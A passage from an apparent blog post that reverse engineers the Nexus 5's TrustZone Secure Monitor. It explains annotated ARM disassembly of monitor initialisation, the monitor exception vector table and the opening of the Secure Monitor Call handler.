&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DFAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear IFAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBCC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear PAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD0&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear PRRR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear NMRR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear &amp;quot;MMUDMTR&amp;quot; ?&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBDC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear &amp;quot;MMUDCPR&amp;quot; ? &lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;dword_FE82B8CC&lt;/span&gt; &lt;span class="c1"&gt;; load Non-Secure VBAR ptr to R1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write Non-Secure VBAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBEC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF0&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear Non-Secure VBAR ptr&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear FCSEIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear CONTEXTIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBFC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRURW&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC00&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRURO&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC04&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRPRW&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC08&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_FW OR SCR_AW ; #0x30&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC0C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; switch back to Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC10&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC14&lt;/span&gt;                 &lt;span class="no"&gt;BX&lt;/span&gt;              &lt;span class="no"&gt;LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC14&lt;/span&gt; &lt;span class="c1"&gt;; End of function sub_FE80DB88&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, the security state is switched to Non-Secure. Then, the
coprocessor registers banked in both security states (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; Banked system control registers) are initialized to zero.
Finally, the security state is switched back to Secure.&lt;/p&gt;
&lt;h5&gt;IV.1.D Setup SP register&lt;/h5&gt;

&lt;p&gt;On ARMv7-A, Multiprocessor Affinity Register (MPIDR) holds the
processor identification information. In this register,
bits&amp;lt;0:7&amp;gt; are the affinity level 0 (Aff0). This number
represents the current CPU id. Here, this id is used to compute the
stack address of current CPU, which is then stored into SP
register. The stack size for each CPU is 0x200 bytes.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB5C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0xFE82B700&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB60&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; write MPIDR value to R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB64&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; keep Affinity level 0 : current virtual CPU id&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB68&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x200&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB6C&lt;/span&gt;                 &lt;span class="no"&gt;MUL&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt; &lt;span class="c1"&gt;; compute stack offset for current vCPU&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB70&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; setup Monitor stack register SP&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.1.E Route FIQ exceptions to Monitor mode&lt;/h5&gt;

&lt;p&gt;CP15 c1 register is present on an ARMv7-A implementation that
includes Security Extensions. This instruction sets bit&amp;lt;2&amp;gt;
(0x4) in Secure Configuration Register (SCR), which means FIQ
exceptions are now taken to Monitor mode.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB74&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0b100 ; SCR.FIQ&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB78&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; set FIQ flag in SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB7C&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; flush the pipeline in the processor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can also notice that bit&amp;lt;0&amp;gt; (SCR.NS : Non-Secure) is not
set, meaning current execution state is Secure.&lt;/p&gt;
&lt;h5&gt;IV.1.F Switch back to Supervisor mode&lt;/h5&gt;

&lt;p&gt;This instruction switches the processor to Supervisor mode, and
sets FIQ &amp;amp; IRQ mask bits.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB80&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MODE_SVC OR CPSR_MASK_FIQ OR CPSR_MASK_IRQ ; switch to Supervisor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Monitor mode setup is now complete. Monitor code can then be
entered through its exception vector table.&lt;/p&gt;
&lt;h3&gt;IV.2. Monitor Exception Vector Table&lt;/h3&gt;

&lt;p&gt;The Monitor exception vector table defines exception vectors to
handle exceptions taken to Monitor Mode.&lt;br&gt;
Its structure is described in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (B1-1167) :&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/nexus5-monitor/ref_vec_table.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;The vector table
entries&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
Thanks to the Monitor initialization code, we know the address of
Nexus 5's Monitor exception vector table:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE0&lt;/span&gt; &lt;span class="no"&gt;monitor_vector_table&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE0&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE4&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE4&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE8&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE8&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;smc_handler&lt;/span&gt; &lt;span class="c1"&gt;; Secure Monitor Call&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEEC&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEEC&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; Prefetch Abort&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF0&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF0&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; Data Abort&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF4&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF4&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF8&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF8&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;sub_FE80CF24&lt;/span&gt; &lt;span class="c1"&gt;; IRQ interrupt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;sub_FE80CFB4&lt;/span&gt; &lt;span class="c1"&gt;; FIQ interrupt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt; &lt;span class="c1"&gt;; End of function monitor_vector_table&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that 3 exception handlers are configured: SMC, FIQ, IRQ.
Others are dead loops.&lt;/p&gt;
&lt;h3&gt;IV.3. Secure Monitor Call handler function&lt;/h3&gt;

&lt;p&gt;HLOS (non-Secure state) can call the TrustZone API (Secure state)
using the SMC instruction to trigger a Secure Monitor Call
exception. This exception is taken to the Monitor mode, which
switches the processor to Secure Supervisor mode to proceed the
call. When called TrustZone function returns, a second SMC
exception is triggered, so the processor enters Monitor mode again.
Finally, the Monitor mode returns results to the calling function
(Non-Secure state).
The Monitor mode acts as a bridge between Non-Secure state and
Secure state. It's designed to handle calls initiated from the
Non-Secure state only.&lt;/p&gt;
&lt;p&gt;The exception vector dedicated to SMC exceptions is a pointer to a
function at offset 0x08 in Monitor Exception Vector Table.&lt;br&gt;
In this function, which will be named SMC handler, the very first
instruction checks if an exception occurred in Secure or Non-Secure
state (When the processor is in Monitor mode, the processor is in
Secure state regardless of the value of the SCR.NS bit).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;smc_handler&lt;/span&gt; 
&lt;span class="no"&gt;LOAD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;FE80D028&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r0&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0x10&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r1&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0xC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r2&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r3&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
